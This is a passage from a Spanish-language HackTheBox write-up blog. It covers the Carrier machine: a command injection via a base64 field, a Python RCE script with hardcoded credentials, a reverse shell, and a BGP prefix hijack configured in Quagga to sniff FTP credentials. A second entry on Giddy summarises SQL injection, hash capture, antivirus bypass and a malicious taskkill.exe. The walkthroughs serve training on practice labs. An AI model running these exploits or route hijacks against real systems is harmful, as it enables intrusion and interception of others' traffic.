77656201e85908|  snmpEngineBoots: 2|_ snmpEngineTime: 3h16m00sService detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Tue Jul 27 25:25:25 2021 -- 1 IP address (1 host up) scanned in 10. 35 secondsPerfecto, exploremos un poquito el servicio: ‚Ä¶  ‚ÄúSNMP - Simple Network Management Protocol is a protocol used to monitor different devices in the network (like routers, switches, printers, IoTs‚Ä¶)‚Äù, hacktricks. Lo cual tiene muuuucho sentido, ya que hay un Access Controller activo, pueda que este servicio lo este monitoreando (: me gusta. Algunas cositas a tener en cuenta para saber que estamos haciendo con la siguiente herramienta, es entender o al menos intentarlo sobre la estructura que maneja SNMP para comunicarse, todo esta en este link:  SNMP - Explained.  No lo explico yo por que se alarga mucho y adem√°s esta super bien detallado ah√≠. Vamos a usar la herramienta snmpwalk con esta estructura: ‚ù± snmpwalk -v2c -c public 10. 10. 10. 105Donde en resumidas cuentas le decimos que nos extraiga del MIB (Base de gesti√≥n de la informaci√≥n) (que ser√≠a la data organizada jer√°rquicamente) todo lo relacionado con la comunidad public, muy resumido :P Pues ejecut√°ndolo nos responde: Solo dos l√≠neas y una con un contenido medio extra√±o, pero a la vez con algo de sentido (NET. . ), se me dio por probar esa cadena (completa) contra el login y el usuario admin (que vimos en la gu√≠a de usuario e. e) pero nada :( PEEEEEEEEEEEEERO si le quitamos el SN# y volvemos a probaaaaaaaaaaaaaaaaaaaar. Tamos dentro pai: Enumeramos recursos ya con una sesi√≥n dentro de la web üîó: Inicialmente recordamos el output del recurso remote. php que hablaba sobre una licencia expirada, ac√° tambi√©n sale algo as√≠, pero diciendo que es inv√°lida :( Hay algunos recursos para ver, caigamos en tickets. php: Uff, varias cositas para leer, los tickets 5 y 6 est√°n llamativos y el 8 habla de nuevo de BGP, jmmm, veamos que hay en Diagnostics (diag. php): Damos clic en Verify Status y obtenemos: Jmmm, parece un output de alg√∫n comando, si investigamos el c√≥digo fuente del la web vemos esto: Una cadena al parecer en base64, si la decodeamos tenemos: ‚ù± echo  cXVhZ2dh  | base64 -dquaggaY si nos fijamos en las peticiones, vemos que ese campo es el que viaja con el m√©todo post, esto me llevo a profundizar con BurpSuite y mostrarles lo siguiente: Abrimos Burp, ponemos el proxy en escucha e interceptamos la petici√≥n: Todo normal, pero ¬øy siiii intentamos enviarle otra cadena en base64? Por ejemplo envi√©mosle la palabra hola encodeada: ‚ù± echo  hola  | base64aG9sYQo= Opa opa opaaaaa, nos muestra el comando que intenta hacer, lista los procesos del sistema y grepea por la cadena que enviamos en base64 üßê ¬øqu√© se les ocurre? ‚Ä¶ Explotaci√≥n #: ¬øY si adem√°s de grepear algo le decimos que ejecute algo m√°s? Intentemos que nos devuelva el resultado del comando id: Para decirle que queremos ejecutar un comando aparte al que esta haciendo simplemente le indicamos un punto y coma (;), as√≠ ejecutara grep ;lo_que_pongamos_ac√°, o sea: grep ; idVeamos si es cierto: ‚ù± echo  ; id  | base64OyBpZAo=La enviamos yyyy: POS MUY BIEEEEN!! Tenemos inyecci√≥n de comandos :o Aprovechemos y generemos un script para automatizar el login, el encode y el envi√≥ del comando, as√≠ solo debemos preocuparnos por pasarle el comando al programa: #!/usr/bin/python3import base64, sys, signalimport requestsfrom bs4 import BeautifulSoup# CTRL+Cdef def_handler(sig, frame):  print()  exit(0)signal. signal(signal. SIGINT, def_handler)# Validamos que el usuario agregue un comandotry:  command = sys. argv[1]except:  print( \n[-] Ejemplo: python3 %s id\n  % (sys. argv[0]))  exit(0)URL =  http://10. 10. 10. 105 # RCEdef exe_commands(command):  text_to_encode =  ;   + command  payload = base64. b64encode(bytes(text_to_encode, 'utf-8')). decode('ascii')  data_post = {     check : payload  }  r = session. post(URL + '/diag. php', data=data_post)  soup = BeautifulSoup(r. content, 'html. parser')  # Sabemos que nos devuelve el resultado del comando desde el segundo tag &lt;p&gt;. . . &lt;/p&gt;,   # as√≠ que si queremos concatenar comandos o ejecutar algunos con un output grande (como `ls -la /`),   # el for nos muestra su resultado con los siguentes &lt;p&gt;. . . &lt;/p&gt;  for i in range(1, 100):    try:      print(soup. find_all('p')[i]. get_text())    except IndexError as e:      passif __name__ == '__main__':  session = requests. Session()  # Login  data_post = {     username :  admin ,     password :  NET_45JDX23   }  r = session. post(URL, data=data_post)  exe_commands(command)Listos, validamos: ‚ù± python3 lyghtwebRCE. py iduid=0(root) gid=0(root) groups=0(root)Pues ahora si indiqu√©mosle que nos genere un reverse Shell, pong√°monos en escucha: ‚ù± nc -lvp 4433Y ejecutamos el comando: TAMOOO DENTROOOOOOOOOOOOOOOOO (: Hagamos tratamiento de la TTY para obtener una Shell completica y sigamos‚Ä¶ Como vemos no estamos en la m√°quina host a√∫n, nuestro hostname se llama r1 y nuestra IP no es 10. 10. 10. 105, as√≠ que tendremos que saltar :) ‚Ä¶ Jugamos con el servicio BGP #: Si enumeramos el sistema vemos cositas que nos recuerdan que hab√≠amos dejado un tema de lado. Vemos servicios activos: root@r1:/# netstat -lnp Un servicio llamado bgpd corriendo en dos puertos, el 2605 y el 179. Y otro servicio llamado zebra corriendo en el puerto 2601. Entendemos algo del protocolo BGP y sus caracter√≠sticas üîó: Les dejo un video muuuuy interesante para entender mejor el protocolo BGP:  YT - What is BGP (Border Gateway Protocol)? An Introduction. Antes hab√≠amos referenciado un art√≠culo para entender lo que hab√≠a en esta imagen: A √©l llegamos buscando info referente a Lyghtspeed Networks (de la imagen), profundizando en el post vemos unas cositas llamadas AS (Sistema Aut√≥nomo), ah√≠, en ese momento, si miramos nuestro diagrama tambi√©n hay algo llamado AS. . . , es cuando nos damos cuenta de que hay muuucha probabilidad de que lo que encontramos (los servicios locales y lo que vimos en los tickets, (hablan mucho de BGP)) este relacionado con nuestro diagrama, as√≠ que descubramos si es as√≠. Como ya rese√±amos, el protocolo BGP (Border Gateway Protocol) permite interconectar grandes grupos de redes, a cada gran red se le conoce como un AS (sistema aut√≥nomo) que se caracterizan por poseer una clara, independiente y √∫nica pol√≠tica de enrutamiento. üôã ¬øSe acuerdan que es un router? ¬øNop? Breeeves:‚ÄúLos routers gu√≠an y dirigen los datos de red mediante paquetes que contienen varios tipos de datos, como archivos, comunicaciones y transmisiones simples como interacciones web‚Äù, cisco.  Caracter√≠stica fundamental de un Sistema Aut√≥nomo: realiza su propia gesti√≥n del tr√°fico que fluye entre √©l y los restantes Sistemas Aut√≥nomos que forman Internet. Wikipedia. Como bien dice el post sobre ataques BGP, el protocolo es como un pegamento y su funci√≥n en -pegar- (conectar) toda la Internet.  ‚ÄúBGP is used for reachability information and routing data packets from one large network to another. ‚Äù r3d-buck3t. ‚Ä¶ Si seguimos enumerando el sistema vemos este script en el directorio /opt: root@r1:/opt$ cat restore. sh #!/bin/shsystemctl stop quaggakillall vtyshcp /etc/quagga/zebra. conf. orig /etc/quagga/zebra. confcp /etc/quagga/bgpd. conf. orig /etc/quagga/bgpd. confsystemctl start quaggaBien, algunas tareas llamativas y otro servicio, Quagga, en internet encontramos que se trata de un software para enrutar y que su uso es muy parecido a la CLI de cisco. Entre los protocolos que soporta esta BGP, as√≠ que busquemos m√°s sobre el software. Llegamos a este recurso que nos ilustra con varios t√©rminos, archivos y l√≠neas de comandos con las que podemos o no jugar :P Algo llamativo del script que vimos antes, es el archivo /etc/quagga/bgpd. conf: root@r1:/opt$ cat /etc/quagga/bgpd. conf!! Zebra configuration saved from vty!  2018/07/02 02:14:27!route-map to-as200 permit 10route-map to-as300 permit 10!router bgp 100 bgp router-id 10. 255. 255. 1 network 10. 101. 8. 0/21 network 10. 101. 16. 0/21 redistribute connected neighbor 10. 78. 10. 2 remote-as 200 neighbor 10. 78. 11. 2 remote-as 300 neighbor 10. 78. 10. 2 route-map to-as200 out neighbor 10. 78. 11. 2 route-map to-as300 out!line vty!Notamos las referencias hacia los ‚Äúvecinos‚Äù (ya veremos que es esto) AS200 y AS300, o sea que si ahora relacionamos el diagrama con estas IPs, podemos organizar nuestras ideas: Perfecto, con ayuda de este recurso sabemos que los ‚Äúvecinos‚Äù son otros routers con los cuales podemos intercambiar informaci√≥n: Listones, pero, de que nos sirve saber todo esto y como se supone que puede haber una explotaci√≥n ah√≠, buaaa, pues facilito. Existe un ataque llamado secuestro de rutas (BGP Hijacking), la labor es hacerle creer a un AS que existe una ruta mucho m√°s corta para enviar la informaci√≥n y esa ruta m√°s corta seremos nosotros en la mitad viendo todo el tr√°fico enviado üíÄ (en resumidas palabras claramente), esta imagen de cloudflare da a entenderlo mejor:  Pueeeees, eso, ehhhh, veamos como romper esto (mucho info, estoy a ü§è de que me explote la cabeza üòÅ, a darle) ‚Ä¶ Entonces tenemos que de alguna manera indicarle que el tr√°fico que sea que se est√© generando entre AS200 y AS300 nos lo muestre a ya sea indic√°ndole al AS200 que nuestra ruta es m√°s r√°pida para llegar a AS300 o dici√©ndole a AS300 que nuestra ruta es m√°s r√°pida para llegar a AS200. Si revisamos nuestro reporte de tickets, podemos intuir cositas con respecto a los routers y sus servicios: Quiz√°s son pistas como pueda que no, pero hablan de un CVE, unos problemas de rutas por malas configuraciones, a CastCom (nuestro router AS300). Temas relacionados con un server en concreto que mantiene un importante servicio FTP y pruebas de inyecci√≥n en rutas :P Muy loco e. e Lo de FTP suena interesante, porque nos podr√≠a estar diciendo que CastCom esta enviando data por FTP. Toma sentido el ataque para interceptar el tr√°fico, ¬øno? Pero igual no sabemos en cu√°l IP de todo el segmento de 10. 120. 15. 0/24 esta el servidor FTP, ni siquiera sabemos cu√°les direcciones de ese segmento est√°n activas, pues averig√º√©moslo: root@r1:/tmp$ cat scanIPs. sh#!/bin/bashfor ip in {1. . 255}; do  timeout 1 bash -c  echo '' &gt; /dev/tcp/10. 120. 15. $ip/21  2&gt;/dev/null &amp;&amp; echo  [+] La IP 10. 120. 15. $ip tiene el puerto 21 abierto  &amp;done; waitLe decimos que nos haga un bucle con 255 repeticiones, donde ese n√∫mero ser√° el √∫ltimo octeto de la IP. Para comprobar si existe una IP con ese PUERTO, enviara una traza por cada IP contra el puerto 21, si en alg√∫n momento la respuesta no nos devuelve error pasa a ejecutar el siguiente comando, o sea, nos muestra la IP que tiene activo el puerto. Si lo ejecutamos, r√°pidamente vemos la IP: root@r1:/tmp$ . /scanIPs. sh [+] La IP 10. 120. 15. 10 tiene el puerto 21 abiertoPos perfecto, ya tenemos la IP. Si quisi√©ramos saber si existen m√°s puertos abiertos en ella, podemos ya sea modificar el script colocando la IP completa y que el iterador ahora est√© en el puerto, o usar nc, por ejemplo para ver el rango de puertos del 20 al 10000 y ver cu√°les est√°n abiertos: root@r1:/tmp$ nc -z -v 10. 120. 15. 10 20-10000 2&gt;&amp;1 | grep succeededConnection to 10. 120. 15. 10 21 port [tcp/ftp] succeeded!Connection to 10. 120. 15. 10 22 port [tcp/ssh] succeeded!Connection to 10. 120. 15. 10 53 port [tcp/domain] succeeded!Tiene activo SSH, FTP y DNS, lindo. Pues sigamos, empecemos a interactuar con la consola de Quagga y los ‚Äúvecinos‚Äù a ver como relacionamos esta IP con los AS. ‚Ä¶ Exploramos CLI de Quagga üîó: Buscando maneras de interactuar con Quagga encontramos:  BGP routing - Peering with Quagga.  How to build a network of Linux routers using quagga.  YT : BGP Path Hijacking Attack Demo - mininet. Para abrir la consola de comandos que se comunica con Quagga usamos el comando vtysh: root@r1:/tmp$ vtysh Hello, this is Quagga (version 0. 99. 24. 1). Copyright 1996-2005 Kunihiro Ishiguro, et al. r1# Perfecto, ya estamos en las puertas del router r1 y su configuraci√≥n‚Ä¶ Del video vemos un comando interesante y que nos devuelve data mucho m√°s interesante: r1# show ip bgp Donde vemos los tres AS‚Äôs y subrayado tenemos las rutas que hacen, por ejemplo la primera ruta para llegar m√°s r√°pido a una IP del segmento 10. 100. 10. 0/24 seria pasar por el AS200 directamente y la segunda mejor ruta es ir del AS300 al AS200. Encontramos este recurso de cisco que nos indica dos cosas de lo que vemos:  * hace referencia a una ruta v√°lida.  &gt; hace referencia a la mejor ruta. Bien, ya entendiendo el output, enfoqu√©monos en la IP relacionada con FTP: Las rutas para llegar m√°s r√°pido a una IP del segmento 10. 120. 15. 0/24 son: ir directamente a AS300 o ir del AS200 al AS300, ac√° es donde debemos nosotros como AS100 buscar la manera de enga√±ar al servidor y hacerle creer que pasar por nosotros es la ruta m√°s r√°pida :) As√≠ lograremos interceptar el tr√°fico‚Ä¶ Si al comando que ejecutamos antes le agregamos una IP, nos muestra las rutas para llegar a esa IP: r1# show ip bgp 10. 120. 15. 10 Perfecto, mucho m√°s entendible por si algo üõ∏ ‚Ä¶ Despu√©s de algunas pruebas nos damos cuenta de que al crear una nueva red con respecto al segmento donde esta la IP que tiene el servidor FTP, se modifican las rutas:  Les paso links de los cuales recopile comandos e hice pruebas:  Configuring BGP (IPv4).  BGP Prefix Hijack Attacks - ColoState.  Soluci√≥n de problemas cuando las rutas del BGP no est√°n anunciadas. As√≠ que lo dicho, vamos a crear una red en el AS100 (nosotros) que en su segmento de IPs contenga la que tiene el servidor FTP, validaremos las rutas de la nueva red eeee interceptaremos el tr√°fico que pase ahora por nuestro AS100: 1. Creamos red: r1# conf tr1(config)# router bgp 100r1(config-router)# network 10. 120. 15. 0/24No voy a profundizar mucho en esto, pero me guiar√© del comentario de Franco Ram√≠rez en Quora para que se entienda un poco la red 10. 120. 15. 0/24: Cada IP tiene 4 octetos, o sea, 4 ‚Äúcajoncitos‚Äù (para ser gr√°ficos) de 8 bits cada uno, por lo cual una IP tendr√≠a en total 32 bits (el c√°lculo de 8*4). Perfecto, toma sentido esto:  ‚ÄúEl n√∫mero 24 nos dice que, de los 32 bits que constituyen la direcci√≥n, 24 le pertenecen a la red‚Äù, nos dice Franco. Si usamos una calculadora de IPs, vemos el rango de direcciones que podemos ahondar con esa red: Crearemos una red que puede tomar IPs desde la 10. 120. 15. 1 hasta la 10. 120. 15. 254, entre ellas esta la que nos interesa, 10. 120. 15. 10, perfecto. 2. Validamos la creaci√≥n de la red y las rutas: r1(config-router)# exitr1(config)# exitr1# show running-config. . . !router bgp 100 bgp router-id 10. 255. 255. 1 network 10. 101. 8. 0/21 network 10. 101. 16. 0/21 network 10. 120. 15. 0/24 redistribute connected neighbor 10. 78. 10. 2 remote-as 200 neighbor 10. 78. 10. 2 route-map to-as200 out neighbor 10. 78. 11. 2 remote-as 300 neighbor 10. 78. 11. 2 route-map to-as300 out!. . . Perfesto, vemos que la red ya esta en la configuraci√≥n, validamos las rutas: r1# show ip bgp. . . Ahora vemos que como ruta deseada por las IPs del segmento 10. 120. 15. 0/24 estamos nosotros, 0. 0. 0. 0 (: validemos si esto es cierto, usemos tcpdump para escuchar el tr√°fico que pase por cualquier interfaz y sobre el puerto 21 (FTP), guardamos todo en un archivo llamado hola. pcap: r1# write How to capture and analyze packets with tcpdump command on Linux. root@~:r1$ tcpdump -i any port 21 -w hola. pcapPero despu√©s de un rato, no se nos guarda nada en el archivo, por lo que sabemos que hay algo extra√±o que no permite a√∫n interceptar el tr√°fico :( Logramos BGP Hijacking pero con un fallito (tamos cerca) üîó: Jugando y jugando, hay algo llamativo: Como ya vimos la red 10. 120. 15. 0/24 nos pondr√° a disposici√≥n 254 hosts, entre ellos el terminado en 10 que es el que necesitamos. Si aumentamos la m√°scara nos restara hosts, por ejemplo con la red 10. 120. 15. 0/25 tendremos 126 hosts y tambi√©n esta la 10. Pero ¬øy si debemos hacer que nuestra red sea lo m√°s especifica posible y que apenas llegue la conexi√≥n se dirija si o si a nosotros? Pues si seguimos los ejemplos de arriba, podemos usar la red 10. 120. 15. 0/28: Ella generar√° simplemente 14 hosts para repartir y si, entre ellos esta la que necesitamos, la 10. Intent√©moslo: r1# conf tr1(config)# router bgp 100r1(config-router)# network 10. 120. 15. 0/28r1(config-router)# exitr1(config)# exitr1# writeBuilding Configuration. . . Configuration saved to /etc/quagga/zebra. confConfiguration saved to /etc/quagga/bgpd. conf[OK]r1#Jugamos ahora con tcpdump: root@~:r1$ tcpdump -i any port 21 -w hola. pcapYyyyyyyy despu√©s de un rato, si vemos el tama√±o del archivoooooooooooooo: root@~:r1$ ls -la . . . -rw-r--r-- 1 root root 9592 Jul 29 25:25 hola. pcap. . . OPAAAA, hay contenido, 9K, si le hacemos un cat no se entiende nada, as√≠ que movamos el archivo a nuestra m√°quina y lo abrimos con wireshark: root@~:r1$ cat hola. pcap | base64 | tr -d '\n'Lo tenemos en base64, copiamos tooodo y ahora: ‚ù± echo  todo_el_base64  | base64 -d &gt; hola. pcap‚ù± file hola. pcap hola. pcap: pcap capture file, microsecond ts (little-endian) - version 2. 4 (Linux cooked v1, capture length 262144)Listones: # Abrimos Wireshark en segundo plano y que no nos ocupe la terminal‚ù± (wireshark hola. pcap &gt;&amp; /dev/null &amp;) Jmmm, mont√≥n de errores en la transmisi√≥n, pero bueno, tenemos respuesta, vemos la comunicaci√≥n entre 10. 78. 10. 2 y 10. 78. 11. 2 contra la IP 10. 120. 15. 10, por lo que vamos suuuuuuuper, ahora solo nos queda ver porque pasa esto‚Ä¶ En internet encontramos esta definici√≥n del error:  Tomada de dynatrace, ‚ÄúDetecting network errors and their impact on services‚Äù. Varias cositas, quiz√°s el paquete se pierda y no llega al destino (nosotros), hay alg√∫n bloqueo o como dice ah√≠, alguna congesti√≥n que evita que los paquetes viajen correctamente‚Ä¶ ‚Ä¶ BGP Hijacking hecho y vemos credenciales en tr√°fico FTP üîó: üö¢ Nutri√©ndonos de info sobre BGP Hijacking encontramos un POC con una estructura pr√°cticamente igual a la que tenemos, solo que son diferentes IPs, pero, es igual, 3 routers y 2 de ellos comunicados mediante FTP:  BGP Hijacking: Demo. Hay una parte en la que agrega unas l√≠neas distintas a las que hemos usado y al final nos muestra que su explotaci√≥n fue hecha con √©xito, as√≠ que podemos probar lo que tiene √©l: Nos explica que usa esas l√≠neas (ya las veremos) porque el tr√°fico no alcanza a llegar al servidor FTP, ya que (en su ejemplo) el router 3 reenv√≠a el tr√°fico al router 1 por un tema de ‚Äúprefijos‚Äù (que serian como indicadores de un conjunto de direcciones). Entonces el tr√°fico queda como en bucle y cada router reenv√≠a la data al otro. Por lo tanto √©l actualiza las pol√≠ticas de enrutamiento en el router 1 indicando que el tr√°fico sea reenviado totalmente hacia el router 3, lo que permite que el servidor FTP reciba las peticiones.  Pueees, suena como algo que nos pueda estar pasando, sigamoslo. Definimos un prefijo que contenga todos los hosts de nuestra red, se llamara holacomoes: r1# conf tr1(config)# ip prefix-list holacomoes seq 5 permit 10. 120. 15. 0/28Evitamos que AS100 comparta las direcciones de nuestro prefijo con AS300: r1(config)# route-map to-as300 deny 5r1(config-route-map)# match ip address prefix-list holacomoesr1(config-route-map)# exitAhora permitimos que AS100 comparta la lista de direcciones con AS200, peeero tambi√©n le decimos (con set . . . ) que AS200 no comparta sus prefijos (listas de direcciones) con otros routers: r1(config)# route-map to-as200 permit 5r1(config-route-map)# match ip address prefix-list holacomoesr1(config-route-map)# set community no-exportr1(config-route-map)# exitr1(config)# exitY ahora simplemente guardamos para que los cambios hagan efecto: r1# clear ip bgp * outr1# writePara ver como nos qued√≥ la conf podemos ya sea ver el archivo /etc/quagga/bgpd. conf o usar: r1# show running-config. . . !router bgp 100 bgp router-id 10. 255. 255. 1 network 10. 101. 8. 0/21 network 10. 101. 16. 0/21 network 10. 120. 15. 0/28 redistribute connected neighbor 10. 78. 10. 2 remote-as 200 neighbor 10. 78. 10. 2 route-map to-as200 out neighbor 10. 78. 11. 2 remote-as 300 neighbor 10. 78. 11. 2 route-map to-as300 out!ip prefix-list holacomoes seq 5 permit 10. 120. 15. 0/28!route-map to-as300 deny 5 match ip address prefix-list holacomoes!route-map to-as200 permit 5 match ip address prefix-list holacomoes set community no-export!route-map to-as200 permit 10!route-map to-as300 permit 10!. . . Listo, pues pong√°monos de nuevo en escucha con tcpdump y descubramos si hay algo nuevo en el tr√°fico:  tcpdump -i any port 21 -w hola. pcap Esperamos un rato.      (Vemos que el tama√±o del archivo es m√°s grande, ¬ønos emocionamos desde ya?)    Copiamos el contenido del archivo, lo pasamos a base64.  Pegamos la cadena en nuestra m√°quina, generamos un archivo con ella.  Abrimos el paquete ya sea con tshark o wireshark: OPAAAAAAAAAAAAAAAAAAAAAAAa que se ve por ah√≠√≠√≠√≠√≠√≠√≠√≠√≠?????????? DIOSSSSSSSSSSSSSS SIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIiiiiiiiiiiiialksdfjlka√±jsdlfk√±jklasjdglkk ¬°Que belleza esto POR FA VOOOOOOOOOOOOOOOOOOOR! Brutal‚Ä¶ Bueno, tenemos unas credenciales de un usuario llamado root en su conexi√≥n contra el servidor FTP, pueeeeeeeeeeeeeeees, hagamos reutilizaci√≥n de contrase√±as y prob√©moslas contra el servicio SSH y el usuario root: ‚ù± ssh root@10. 10. 10. 105root@10. 10. 10. 105's password:. . . TAMOO compai‚Äô, estamos en el sistema como el usuario root, en el trafico FTP vimos algo sobre un archivo llamado secretdata. txt, pero el contenido es el hash de la flag user. txt, as√≠ que no nos preocupamos por el. Veamos las flags: Po hemo teminao‚Äô ‚Ä¶ Muy divertida esta m√°quina, locura brutal el tema del BGP Hijacking, debo decir que las redes no son ni mi fuerte ni mi gusto, pero uff esta m√°quina me hizo como olvidarme de esto y disfrutar un m√≥nton el proceso. Increible esto ‚õ≤ Y bueno, nos leeremos despues, muchas gracias por todo &lt;3 YYYYYYY a seguir rompiendo todo!! "
    }, {
    "id": 32,
    "url": "http://localhost:4000/htb/giddy",
    "title": "HackTheBox - Giddy",
    "body": "2021/07/27 - M√°quina Windows nivel medio. Jugaremos con inyecciones SQL del servicio MSSQL. Pero no vamos dumpear bases de datos, nop, vamos a ejecutar comandos :o que ser√°n interceptados (smbclient y responder) para obtener cositas (hashes). Y jugaremos a bypassear antivirus, Windows Defender y App Lockers para subir binarios maliciosos (o quiz√°s no tan maliciosos e incluso sutiles como dos l√≠neas de c√≥digo).  TL;DR (Spanish writeup): Creada por: lkys37en. ¬°Una bestialidad ehh! M√°quina, m√°quinita, m√°quinota. Vamos inicialmente a jugar con un servidor web que mantiene dos recursos, una PowerShell Web y apartado con muuuchos productos, jugando con este √∫ltimo llegaremos a una inyecci√≥n SQL basada en errores, esto en el servicio Microsoft SQL Server. Nos crearemos un liiiindo script para dumpear toda la data que queramos con respecto a variables del sistema, tablas, columnas, etc.  extract_data_sqli. py Enumerando las bases de datos no encontraremos nada relevante, pasaremos a inyectar comandos del propio MSSQL, jugando con esto llegaremos a la funci√≥n xp_dirtree, la usaremos para por medio de la herramienta responder interceptar un hash Net-NTLMv2 del usuario Stacy. Crackeando el hash conseguiremos una contrase√±a, haciendo reutilizaci√≥n de contrase√±as y con la ayuda de evil-winrm obtendremos una sesi√≥n en la m√°quina como Stacy. Encontraremos un servicio llamado unifi-video en el sistema, enumerando veremos una vulnerabilidad relacionada que permite escalar privilegios, esto debido a que una vez el servicio es detenido o iniciado va a intentar ejecutar un objeto llamado taskkill. exe de la ruta ra√≠z del programa. Podemos aprovecharnos de nuestros permisos para agregar un binario taskkill. exe con contenido malicioso en esa ruta y hacer que el servicio lo ejecute. PEEEEEROOO no va a ser tan sencillo, ya que hay varias barreras, posiblemente exista un antivirus, el mismo Windows Defender o un App Locker bloqueando binarios por doquier. Jugando con phantom-evasion (no nos funciona para la explotaci√≥n final) para evadir antivirus logramos hacer el bypass pero no la obtenci√≥n de una Shell. Finalmente nos crearemos un script que ejecute el binario nc. exe, lo compilaremos con ayuda de mingw-w64 y lo nombraremos taskkill. exe, jugando y jugando lograremos que el servicio ejecute ese archivo y obtendremos una Reverse Shell enviada por nc hacia nuestra m√°quina como el usuario NT authority system. ‚Ä¶ Clasificaci√≥n de la m√°quina: Bastaaaaaante real y con vulnerabilidades conocidas, estas m√°quinas son fascinantes.  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo mostrar lo que hice. ‚Ä¶ Es tu momento de brillar, disfruta cada instante.  Enumeraci√≥n.      Enumeraci√≥n de puertos con nmap.    Recorremos el servicio web del puerto 80 y el del puerto 443.     Explotaci√≥n, encontramos inyecci√≥n SQL basada en errores.      Jugamos con ORDER BY para extraer el n√∫mero concreto de columnas mediante la SQLi.    De las 25 columnas, vemos en cu√°les podemos almacenar texto.    Extraemos las bases de datos del servicio MSSQL.    Jugando con comandos de MSSQL para conectarnos a una carpeta compartida y extraer hashes Net-NTLMv2.     Escalada de privilegios, explotamos el servicio unifi-video.      Generamos archivo taskkill. exe malicioso.    Buscamos servicio del sistema relacionado a unifi-video.    Intentamos que el servicio unifi-video ejecute taskkill. exe (binario malicioso).    Evadimos Antivirus, Windows Defender, App Locker y lo que se venga.    ‚Ä¶ Enumeraci√≥n #: Enumeraci√≥n de puertos con nmap üîó: Veamos inicialmente que puertos tiene activos la m√°quina, as√≠ sabremos por donde empezar a tirar hilos: ‚ù± nmap -p- --open -v 10. 10. 10. 104 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -v   Permite ver en consola lo que va encontrando       -oG   Guarda el output en un archivo con formato grepeable para usar una funci√≥n extractPorts de S4vitar que me extrae los puertos en la clipboard   Nos responde: ‚ù± cat initScan# Nmap 7. 80 scan initiated Fri Jul 23 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10. 10. 10. 104# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 104 ()	Status: UpHost: 10. 10. 10. 104 ()	Ports: 80/open/tcp//http///, 443/open/tcp//https///, 3389/open/tcp//ms-wbt-server///	Ignored State: filtered (65532)# Nmap done at Fri Jul 23 25:25:25 2021 -- 1 IP address (1 host up) scanned in 280. 46 seconds      Puerto   Descripci√≥n         80   HTTP: Nos brinda un servidor web.        443   HTTPS: Le agrega un certificado SSL para hacer ‚Äúm√°s fuerte‚Äù la seguridad de una web.        3389   ms-wbt-server: Al parecer es un puerto que nos provee con una interfaz gr√°fica para conectarnos a otros dispositivos. Confirm√©moslo con el siguiente escaneo.        5985   WinRM: Que nos permite realizar tareas administrativas remotamente (en pocas palabras)   Teniendo los puertos, juguemos con un escaneo de versiones y scripts, as√≠ vemos m√°s a detalle la info de cada puerto. ~(Usando la funci√≥n extractPorts (referenciada antes) podemos copiar r√°pidamente los puertos en la clipboard, as√≠ no tenemos que ir uno a uno ‚ù± extractPorts initScan [*] Extracting information. . .   [*] IP Address: 10. 10. 10. 104  [*] Open ports: 80,443,3389,5985[*] Ports copied to clipboard)~ ‚ù± nmap -p 80,43,3389,5985 -sC -sV 10. 10. 10. 104 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   Obtenemos: ‚ù± cat portScan# Nmap 7. 80 scan initiated Fri Jul 23 25:25:25 2021 as: nmap -p 80,443,3389,5985 -sC -sV -oN portScan 10. 10. 10. 104Nmap scan report for 10. 10. 10. 104Host is up (0. 11s latency). PORT   STATE SERVICE    VERSION80/tcp  open http     Microsoft IIS httpd 10. 0| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10. 0|_http-title: IIS Windows Server443/tcp open ssl/http   Microsoft IIS httpd 10. 0| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10. 0|_http-title: IIS Windows Server| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite| Not valid before: 2018-06-16T21:28:55|_Not valid after: 2018-09-14T21:28:55|_ssl-date: 2021-07-23T15:29:06+00:00; +5m26s from scanner time. | tls-alpn: |  h2|_ http/1. 13389/tcp open ms-wbt-server Microsoft Terminal Services| rdp-ntlm-info: |  Target_Name: GIDDY|  NetBIOS_Domain_Name: GIDDY|  NetBIOS_Computer_Name: GIDDY|  DNS_Domain_Name: Giddy|  DNS_Computer_Name: Giddy|  Product_Version: 10. 0. 14393|_ System_Time: 2021-07-23T15:29:02+00:00| ssl-cert: Subject: commonName=Giddy| Not valid before: 2021-05-03T14:56:04|_Not valid after: 2021-11-02T14:56:04|_ssl-date: 2021-07-23T15:29:06+00:00; +5m26s from scanner time. 5985/tcp open http     Microsoft HTTPAPI httpd 2. 0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2. 0|_http-title: Not FoundService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 5m25s, deviation: 0s, median: 5m25sService detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Fri Jul 23 25:25:25 2021 -- 1 IP address (1 host up) scanned in 20. 24 secondsTenemos algunas cositas relevantes:       Puerto   Servicio   Versi√≥n         80   HTTP   Microsoft IIS httpd 10. 0       443   HTTPS   Microsoft IIS httpd 10. 0   Vemos un commonName muy atractivo:  commonName=PowerShellWebAccessTestWebSiteNos da la idea de tener una Shell en la web, ya veremos.       Puerto   Servicio   Versi√≥n         3389   RDP   Microsoft Terminal Services   Muchas referencias al nombre Giddy (mayusculas y minusculas)  DNS_Computer_Name: GiddyJmmm, pues empecemos a explorar cada puerto y descubramos por donde podemos romperlos. ‚Ä¶ Puerto 80 üîó: Un perrito :D de primeras se me ocurre algo con estenograf√≠a (ojal√° no), pero sigamos explorando‚Ä¶ Hagamos un fuzzeo de directorios a ver si algo se nos escapa de los ojos: ‚ù± dirsearch. py -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories. txt -u http://10. 10. 10. 104. . . Target: http://10. 10. 10. 104/[25:25:25] 